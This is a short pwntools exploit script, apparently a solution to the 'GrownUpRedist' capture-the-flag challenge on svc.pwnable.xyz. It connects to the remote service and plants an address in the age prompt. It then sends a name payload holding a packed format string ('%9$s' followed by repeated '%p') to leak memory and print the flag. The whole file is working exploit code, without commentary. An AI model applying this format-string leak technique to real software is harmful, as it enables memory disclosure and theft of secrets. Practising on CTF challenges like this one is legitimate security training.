from pwn import *

# p = process('./GrownUpRedist')
p = remote('svc.pwnable.xyz', 30004)

p.recvuntil('Are you 18 years or older? [y/N]:')
p.send('YYYYYYYY' + p64(0x601080))
p.recvuntil('Name:')

p.sendline('A'*0x20 + p64(0x2020202073243925) + p64(0x7025207025207025)*11 + 'A')
print p.recvuntil('}')

